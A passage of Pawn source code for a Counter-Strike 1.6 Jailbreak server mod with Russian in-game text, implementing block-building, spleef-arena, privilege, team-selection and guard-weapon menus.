	}
}

Chicken_Delete()
{
	new iEntity = g_ObjectChicken;
	g_ObjectChicken = 0;
	
	if(!pev_valid(iEntity))
		return;
	
	engfunc(EngFunc_RemoveEntity, iEntity);
}

Chicken_Rotate(iType)
{
	new iEntity = g_ObjectChicken;
	if(!pev_valid(iEntity))
		return;
	
	set_pev(iEntity, pev_iuser1,	iType);
	set_pev(iEntity, pev_sequence, 	2);
	set_pev(iEntity, pev_framerate, 1.0);
	set_pev(iEntity, pev_nextthink, get_gametime() + 0.1);
}

public Chicken_Think(iEntity)
{
	if(!pev_valid(iEntity))
		return;
	
	new iType = pev(iEntity, pev_iuser1);
	if(!iType)
		return;
	
	static Float:fAngles[3];
	iType = pev(iEntity, pev_iuser1);
	pev(iEntity, pev_angles, fAngles);
	switch(iType)
	{
		case 1: fAngles[1] += 15.0;
		case 2: fAngles[1] -= 15.0;
	}
	set_pev(iEntity, pev_angles, fAngles);
	
	if(random_num(1, 100) <= 2)
	{
		set_pev(iEntity, pev_iuser1, 		0);
		set_pev(iEntity, pev_sequence, 		6);
		set_pev(iEntity, pev_framerate, 	1.0);
		set_pev(iEntity, pev_nextthink, 	get_gametime() + 1.0);
		return;
	}
	set_pev(iEntity, pev_nextthink, get_gametime() + 0.1);
}

public Cmd_BuildMenu(id) return Show_BuildMenu(id, g_iMenuPosition[id]);
Show_BuildMenu(id, iPos)
{
	new szMenu[512], iKeys = (1<<8|1<<9), iLen;
	if(!iPos)
	{
		new const szBlockName[][] = 
		{
			"Золота руда (1/6)",
			"Торт (2/6)",
			"Стекло (3/6)",
			"Плитка (4/6)",
			"Лёд (5/6)",
			"Обсидиан (6/6)"
		};
		
		iKeys |= (1<<3|1<<5);
		iLen = formatex(szMenu, charsmax(szMenu), "Строительство^n\dСтоит: \y%d из %d^n^n", g_BlocksCount, MAX_BLOCKS);
		if(g_BlocksCount < MAX_BLOCKS)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wПоставить^n");
			iKeys |= (1<<0);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \dПоставить^n");
		if(g_BlocksCount)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wУдалить^n");
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wУдалить всё^n^n");
			iKeys |= (1<<1|1<<2);
		}
		else
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \dУдалить^n");
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \dУдалить всё^n^n");
		}
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wБлок: \y%s^n", szBlockName[g_PlayerBuild[id][FORM]]);
		if(g_PlayerBuild[id][SOLID])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wРазрушаемый: %s^n", g_PlayerBuild[id][DESTROY] ? "\yВкл" : "\rВыкл");
			iKeys |= (1<<4);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \dРазрушаемый: %s^n", g_PlayerBuild[id][DESTROY] ? "Вкл" : "Выкл");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wМатериальный: %s^n", g_PlayerBuild[id][SOLID] ? "\yВкл" : "\rВыкл");
		if(g_PlayerBuild[id][SOLID])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \wВ столбик: %s^n", g_PlayerBuild[id][COLUMN] ? "\yВкл" : "\rВыкл");
			iKeys |= (1<<6);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \dВ столбик: %s^n", g_PlayerBuild[id][COLUMN] ? "Вкл" : "Выкл");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \wПлатформы");
	}
	else
	{
		iKeys |= (1<<1);
		iLen = formatex(szMenu, charsmax(szMenu), "Платформы^n\dСтоит: \y%d из %d^n^n", g_BlocksCount, MAX_BLOCKS);
		if(g_BlocksCount + (g_PlayerBuild[id][ARENA] * g_PlayerBuild[id][ARENA]) < MAX_BLOCKS)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wПоставить^n");
			iKeys |= (1<<0);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \dПоставить^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wРазмер: \y%dx%d^n", g_PlayerBuild[id][ARENA], g_PlayerBuild[id][ARENA]);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \wСтроительство");
	}
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_BuildMenu");
}

public Handle_BuildMenu(id, iKey)
{
	switch(iKey)
	{
		case 0: 
		{
			if(!g_iMenuPosition[id])
			{
				new Float:vOrigin[3];
				if(g_PlayerBuild[id][SOLID] && g_PlayerBuild[id][COLUMN])
				{
					new iEntity = -1, iBody;
					get_user_aiming(id, iEntity, iBody);
					if(!pev_valid(iEntity) || pev(iEntity, pev_iuser1) != SPECIAL_CODE_BLOCK)
					{
						client_print(id, print_center, "Материальный блок не найден, наведите на него!");
						return Show_BuildMenu(id, g_iMenuPosition[id]);
					}	
					
					pev(iEntity, pev_origin, vOrigin);
					switch(pev(iEntity, pev_iuser2))
					{
						case 0,2,5,6: 	vOrigin[2] += 30.0;
						case 1,3: 		vOrigin[2] += 14.8;
					}
					vOrigin[2] += 5.0;
					new tr; engfunc(EngFunc_TraceHull, vOrigin, vOrigin, 0, HULL_POINT, 0, tr);
					if(get_tr2(tr, TR_StartSolid) || get_tr2(tr, TR_AllSolid))
					{
						client_print(id, print_center, "Выше уже стоит блок!");
						return Show_BuildMenu(id, g_iMenuPosition[id]);
					}
					vOrigin[2] -= 5.0;
				}
				else fm_get_aiming_position(id, vOrigin);
				Block_Create(vOrigin, g_PlayerBuild[id][FORM], g_PlayerBuild[id][DESTROY], g_PlayerBuild[id][SOLID]);
				UTIL_SendAudio(0, _, g_szSounds[BLOCK_ADD]);
			}
			else BlockArena_Create(id, g_PlayerBuild[id][ARENA], 0, g_PlayerBuild[id][FORM], g_PlayerBuild[id][DESTROY], g_PlayerBuild[id][SOLID]);
		}
		case 1: 
		{
			if(g_iMenuPosition[id])
			{
				if(++g_PlayerBuild[id][ARENA] == 11) 
					g_PlayerBuild[id][ARENA] = 3;
			}	
			else Block_Delete(id, false);
		}
		case 2: Block_Delete(id, true);
		case 3: if(++g_PlayerBuild[id][FORM] == 6) g_PlayerBuild[id][FORM] = 0;
		case 4: g_PlayerBuild[id][DESTROY] = !g_PlayerBuild[id][DESTROY];
		case 5: g_PlayerBuild[id][SOLID] = !g_PlayerBuild[id][SOLID];
		case 6: g_PlayerBuild[id][COLUMN] = !g_PlayerBuild[id][COLUMN];
		case 8: g_iMenuPosition[id] ^= 1;
		case 9: return PLUGIN_HANDLED;
	}
	return Show_BuildMenu(id, g_iMenuPosition[id]);
}

Block_Create(Float:vOrigin[3], iBody, bool:bDestroy, bool:bSolid, bool:bSpleef = false)
{
	if(g_BlocksCount >= MAX_BLOCKS && !bSpleef)
		return;	
	
	new iEntity = -1; static siBlock;
	if(siBlock || (siBlock = engfunc(EngFunc_AllocString, "info_target"))) 
		iEntity = engfunc(EngFunc_CreateNamedEntity, siBlock);
	
	if(!pev_valid(iEntity)) 
		return;
	
	set_pev(iEntity, 	pev_classname, 		bSpleef ? g_szClassSpleef : g_szClassBlock);
	set_pev(iEntity, 	pev_movetype, 		MOVETYPE_NONE);
	set_pev(iEntity, 	pev_solid, 			SOLID_BBOX);
	set_pev(iEntity, 	pev_iuser2, 		iBody);
	set_pev(iEntity, 	pev_iuser1, 		bSpleef ? SPECIAL_CODE_SPLEEF : SPECIAL_CODE_BLOCK);
	set_pev(iEntity, 	pev_modelindex, 	g_ModelBlockIndex[iBody]);
	
	engfunc(EngFunc_SetOrigin, 	iEntity, 	vOrigin);

	if(bSolid)
	{
		switch(iBody)
		{
			case 0,2,4,5,6: engfunc(EngFunc_SetSize, iEntity, 	Float:{-15.0, -15.0, 0.0}, 	Float:{15.0, 15.0, 30.0});
			case 1,3: 		engfunc(EngFunc_SetSize, iEntity, 	Float:{-15.0, -15.0, 0.0}, 	Float:{15.0, 15.0, 15.0});
		}
		if(bDestroy)
		{
			set_pev(iEntity, pev_takedamage, 	DAMAGE_YES);
			set_pev(iEntity, pev_health, 		1.0);
		}
	}
	
	if(!bSpleef)
		g_BlocksCount++;
	else
		g_Spleef[COUNT]++;
}

Block_Delete(id, bool:bAll)
{
	new iEntity = -1; 
	if(!bAll)
	{
		new iBody; get_user_aiming(id, iEntity, iBody);
		if(!pev_valid(iEntity) || pev(iEntity, pev_iuser1) != SPECIAL_CODE_BLOCK)
		{
			new Float:vOrigin[3];
			fm_get_aiming_position(id, vOrigin);
			while((iEntity = engfunc(EngFunc_FindEntityInSphere, iEntity, vOrigin, 15.0)) > 0) 
			{
				if(pev(iEntity, pev_iuser1) != SPECIAL_CODE_BLOCK)
					continue;
				
				engfunc(EngFunc_RemoveEntity, iEntity);
				g_BlocksCount--;
				break;
			}
		}
		else
		{
			engfunc(EngFunc_RemoveEntity, iEntity);
			g_BlocksCount--;
		}
	}
	else
	{
		while((iEntity = engfunc(EngFunc_FindEntityByString, iEntity, "classname", g_szClassBlock)))
			engfunc(EngFunc_RemoveEntity, iEntity);
		
		g_BlocksCount = 0;
	}
}

BlockArena_Create(id, iPos, iDistance, iBody, bool:bDestroy, bool:bSolid, bool:bSpleef = false)
{
	new Float:vOrigin[2][3], Float:fDistance[] = { 30.0, 40.0, 55.0, 80.0 };
	fm_get_aiming_position(id, vOrigin[0]);
	for(new i = 1; i <= iPos; i++)
	{
		vOrigin[1][0] = vOrigin[0][0] + (fDistance[iDistance] * i);
		vOrigin[1][1] = vOrigin[0][1];
		vOrigin[1][2] = vOrigin[0][2];
		Block_Create(vOrigin[1], iBody, bDestroy, bSolid, bSpleef);
		for(new j = 1; j < iPos; j++)
		{
			vOrigin[1][1] = vOrigin[0][1] + (fDistance[iDistance] * j);
			Block_Create(vOrigin[1], iBody, bDestroy, bSolid, bSpleef);
		}
	}
}

public Show_SpleefMenu(id)
{
	if(g_iChiefId != id) 
		return PLUGIN_HANDLED;
	
	new const szMenuSpleef[][] = 
	{
		"\yНет",
		"\r||",
		"\r||||",
		"\r||||||"
	};
	
	new szMenu[512], iKeys = (1<<3|1<<4|1<<5|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "Сплиф^n^n");
	if(!g_Spleef[COUNT]) 
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wУстановить арену^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dУдалить арену^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dВыдать оружие^n");
		iKeys |= (1<<0);
	}
	else 
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dУстановить арену^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wУдалить арену^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wВыдать оружие^n");
		iKeys |= (1<<1|1<<2);
	}
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\d> выдается тем, кто возле арены^n^nНастройки:^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wРазмер: \y%dx%d^n", g_PlayerBuild[id][ARENA], g_PlayerBuild[id][ARENA]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wРазрушение: %s^n", g_Spleef[DESTROY] ? "\yВкл" : "\rВыкл");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wРасстояние между блоков: %s^n", szMenuSpleef[g_Spleef[DISTANCE][id]]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_SpleefMenu");
}

public Handle_SpleefMenu(id, iKey)
{
	if(g_iChiefId != id) 
		return PLUGIN_HANDLED;
	
	switch(iKey)
	{
		case 0:
		{
			if(!g_Spleef[COUNT])
			{
				new Float:vOrigin[3]; fm_get_aiming_position(id, vOrigin);
				BlockArena_Create(id, g_PlayerBuild[id][ARENA], g_Spleef[DISTANCE][id], 6, true, true, true);
				EnableHamForward(g_HamHookSpleefKill);
				UTIL_SendAudio(0, _, g_szSounds[BLOCK_ADD]);
			}
		}
		case 1: Spleef_Delete();
		case 2:
		{
			if(g_Spleef[COUNT])
			{
				for(new i = 1, Float:vOrigin[3], iEntity = -1; i <= g_iMaxPlayers; i++)
				{
					if(g_iUserTeam[i] != 1 || IsNotSetBit(g_iBitUserAlive, i) || pev(i, pev_weapons) & (1<<CSW_SCOUT))
						continue;
					
					pev(i, pev_origin, vOrigin);
					while((iEntity = engfunc(EngFunc_FindEntityInSphere, iEntity, vOrigin, 50.0)))
					{
						if(pev(iEntity, pev_iuser1) != SPECIAL_CODE_SPLEEF)
							continue;
						
						fm_give_item(i, "weapon_scout");
						fm_set_user_bpammo(i, CSW_SCOUT, 90);
					}
				}
			}
		}
		case 3: if(++g_PlayerBuild[id][ARENA] == 11) g_PlayerBuild[id][ARENA] = 3;
		case 4: g_Spleef[DESTROY] = g_Spleef[DESTROY] ? false : true;
		case 5: if(++g_Spleef[DISTANCE][id] == 4) g_Spleef[DISTANCE][id] = 0;
		case 8: return Show_SuperSimonMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_SpleefMenu(id);
}

Spleef_Delete()
{
	if(!g_Spleef[COUNT])
		return;
	
	new iEntity = -1;
	while((iEntity = engfunc(EngFunc_FindEntityByString, iEntity, "classname", g_szClassSpleef)))
		engfunc(EngFunc_RemoveEntity, iEntity);
	
	g_Spleef[COUNT] = 0;
	g_Spleef[DESTROY] = false;
	DisableHamForward(g_HamHookSpleefKill);
}

public Ham_TakeDamage_Spleef(iEntity, iInflictor, iAttacker, Float:fDamage, iBitDamage)
{
	if(!pev_valid(iEntity) || pev(iEntity, pev_iuser1) != SPECIAL_CODE_SPLEEF || !jbe_is_user_valid(iAttacker))
		return HAM_IGNORED;

	if(!g_Spleef[DESTROY] || g_iUserTeam[iAttacker] != 1 && g_iChiefId != iAttacker) 
		return HAM_SUPERCEDE;
	
	if(!--g_Spleef[COUNT])
	{
		g_Spleef[DESTROY] = false;
		DisableHamForward(g_HamHookSpleefKill);
	}
	return HAM_IGNORED;
}

Show_PrivilegesMenu(id)
{	
	new szMenu[1024], iKeys = (1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_MAIN_PRIVILEGES_TITLE");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserVip, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_MAIN_VIP");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_VIP");
	if(IsSetBit(g_iBitUserAdmin, id))
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_MAIN_ADMIN");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_ADMIN");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserPremium, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_MAIN_PREMIUM");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_PREMIUM");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserElite, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_MAIN_ELITE");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_ELITE");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserAlpha, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_MAIN_ALPHA");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_ALPHA");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserStraj, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n^n", id, "JBE_MENU_MAIN_STRAJ");
		iKeys |= (1<<5);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n^n", id, "JBE_MENU_MAIN_STRAJ");
	
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserDelta, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_MAIN_DELTA");
		iKeys |= (1<<6);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_DELTA");
	
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserDyavol, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_MENU_MAIN_DYAVOL");
		iKeys |= (1<<7);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_DYAVOL");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_NEXT");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_PrivilegesMenu");
}

public Handle_PrivilegesMenu(id, iKey)
{
	switch(iKey)
	{
		case 0: return Show_VipMenu(id); 
		case 1: return Show_AdminMenu(id);
		case 2: return Show_PremiumMenu(id); 
		case 3: return Show_EliteMenu(id);
		case 4: return Show_AlphaMenu(id);
		case 5: return Show_StrajMenu(id);
		case 6: return Show_DeltaMenu(id);
		case 7: return Show_DyavolMenu(id);
		case 8: return Show_PrivilegesTwo(id);
		case 9: 
		{
			switch(g_iUserTeam[id])
			{
				case 1: return Show_MainPnMenu(id);
				case 2: return Show_MainGrMenu(id);
			}
		}
	}
	return PLUGIN_HANDLED;
}

Show_PrivilegesTwo(id)
{	
	new szMenu[1024], iKeys = (1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_MAIN_PRIVILEG_TITLE");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserPrez, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_MAIN_PREZIDENT");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_PREZIDENT");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserDemon, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_MAIN_DEMON");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_DEMON");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserCloun, id) || g_iRejim)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_MAIN_CLOUN");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_CLOUN");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_PrivilegesTwo");
}

public Handle_PrivilegesTwo(id, iKey)
{
	switch(iKey)
	{
		case 0:
		{
			switch (g_iUserTeam[id])
			{
				case 1:
				{
					if((g_iDayMode == 1 || g_iDayMode == 2))
					{
						return Show_PrezidentMenu_1(id);
					}
				}
				case 2:
				{
					if((g_iDayMode == 1 || g_iDayMode == 2))
					{
						return Show_PrezidentMenu_2(id);
					}
				}
			}
		}
		case 1:
		{
			switch (g_iUserTeam[id])
			{
				case 1:
				{
					if((g_iDayMode == 1 || g_iDayMode == 2))
					{
						return Show_DemonMenu_1(id);
					}
				}
				case 2:
				{
					if((g_iDayMode == 1 || g_iDayMode == 2))
					{
						return Show_DemonMenu_2(id);
					}
				}
			}
		}
		case 2: return Show_ClounMenu(id);
		case 8: return Show_PrivilegesMenu(id);
		case 9: 
		{
			switch(g_iUserTeam[id])
			{
				case 1: return Show_MainPnMenu(id);
				case 2: return Show_MainGrMenu(id);
			}
		}
	}
	return PLUGIN_HANDLED;
}

Show_ChooseTeamMenu(id, iType)
{
	if(jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys, iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_TEAM_TITLE", g_iAllCvars[TEAM_BALANCE]);
	if(g_iUserTeam[id] != 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_TEAM_PRISONERS", g_iPlayersNum[1]);
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_TEAM_PRISONERS", g_iPlayersNum[1]);
	if(!g_iBlockCt)
	{
		if(g_iUserTeam[id] != 2 && ((abs(g_iPlayersNum[1] - 1) / g_iAllCvars[TEAM_BALANCE]) + 1) > g_iPlayersNum[2])
		{
			if(IsNotSetBit(g_iBitUserBlockedGuard, id))
			{
				iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n^n", id, "JBE_MENU_TEAM_GUARDS", g_iPlayersNum[2]);
				iKeys |= (1<<1);
			}
			else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r[Вы заблокированы]^n^n", id, "JBE_MENU_TEAM_GUARDS", g_iPlayersNum[2]);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n^n", id, "JBE_MENU_TEAM_GUARDS", g_iPlayersNum[2]);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r[Массовая блокировка]^n^n", id, "JBE_MENU_TEAM_GUARDS", g_iPlayersNum[2]);
	if(g_iUserTeam[id] != 2)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_TEAM_RANDOM");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_TEAM_RANDOM");
	
	if(g_iUserTeam[id] != 3)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_TEAM_SPECTATOR");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_TEAM_SPECTATOR");
	if(iType)
	{
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
		iKeys |= (1<<9);
	}
	return show_menu(id, iKeys, szMenu, -1, "Show_ChooseTeamMenu");
}

public Handle_ChooseTeamMenu(id, iKey)
{
	switch(iKey)
	{
		case 0:
		{
			if(g_iUserTeam[id] == 1) return Show_ChooseTeamMenu(id, 1);
			if(!jbe_set_user_team(id, 1)) return PLUGIN_HANDLED;
		}
		case 1:
		{
			if(g_iUserTeam[id] == 2) return Show_ChooseTeamMenu(id, 1);
			if(IsNotSetBit(g_iBitUserBlockedGuard, id) && ((abs(g_iPlayersNum[1] - 1) / g_iAllCvars[TEAM_BALANCE]) + 1) > g_iPlayersNum[2])
			{
				if(!jbe_set_user_team(id, 2)) return PLUGIN_HANDLED;
			}
			else
			{
				if(g_iUserTeam[id] == 1) return Show_ChooseTeamMenu(id, 1);
				else return Show_ChooseTeamMenu(id, 0);
			}
		}
		case 2:
		{
			if(((abs(g_iPlayersNum[1] - 1) / g_iAllCvars[TEAM_BALANCE]) + 1) > g_iPlayersNum[2])
			{
				switch(random_num(1, 2))
				{
					case 1: if(!jbe_set_user_team(id, 1)) return PLUGIN_HANDLED;
					case 2:
					{
						if(!jbe_set_user_team(id, 2)) return PLUGIN_HANDLED;
						
					}
				}
			}
			else
			{
				if(g_iUserTeam[id] == 1 || g_iUserTeam[id] == 2) return Show_ChooseTeamMenu(id, 1);
				else return Show_ChooseTeamMenu(id, 0);
			}
		}
		case 3:
		{
			if(g_iUserTeam[id] == 3) return Show_ChooseTeamMenu(id, 0);
			if(!jbe_set_user_team(id, 3)) return PLUGIN_HANDLED;
		}
	}
	return PLUGIN_HANDLED;
}

Show_WeaponsGuardMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_WEAPONS_GUARD_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_WEAPONS_GUARD_AK47");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_WEAPONS_GUARD_M4A1");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n^n", id, "JBE_MENU_WEAPONS_GUARD_XM1014");
	if(IsSetBit(g_iBitUserVip, id))
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_WEAPONS_GUARD_AKKNIFE");
        iKeys |= (1<<3);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_WEAPONS_GUARD_AKKNIFE");
	if(IsSetBit(g_iBitUserDemon, id))
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_WEAPONS_GUARD_AKS");
        iKeys |= (1<<4);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_WEAPONS_GUARD_AKS");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_WeaponsGuardMenu");
}

public Handle_WeaponsGuardMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id))
	{
		if(g_iBitKilledUsers[id]) return Cmd_KilledUsersMenu(id);
		return PLUGIN_HANDLED;
	}
	if(WeaponChoosed[id])
    {
		UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NO_WEAPONS");
        return PLUGIN_HANDLED;
    }
    switch(iKey)
    {
        case 0:
        {
            fm_strip_user_weapons(id);
            fm_give_item(id, "item_kevlar");
            fm_give_item(id, "weapon_knife");
            fm_give_item(id, "weapon_ak47");
            fm_set_user_bpammo(id, CSW_AK47, 999);
            WeaponChoosed[id] = true;
            return Show_WeaponsGuardPistolMenu(id);
        }
        case 1:
        {
            fm_strip_user_weapons(id);
            fm_give_item(id, "weapon_knife");
            fm_give_item(id, "weapon_m4a1");
            fm_set_user_bpammo(id, CSW_M4A1, 999);
            fm_give_item(id, "item_kevlar");
            WeaponChoosed[id] = true;
            return Show_WeaponsGuardPistolMenu(id);
        }
        case 2:
        {
            fm_strip_user_weapons(id);
            fm_give_item(id, "weapon_knife");
            fm_give_item(id, "weapon_m3");
            fm_set_user_bpammo(id, CSW_M3, 999);
            fm_give_item(id, "item_kevlar");
            WeaponChoosed[id] = true;
            return Show_WeaponsGuardPistolMenu(id);
        }
		case 3:
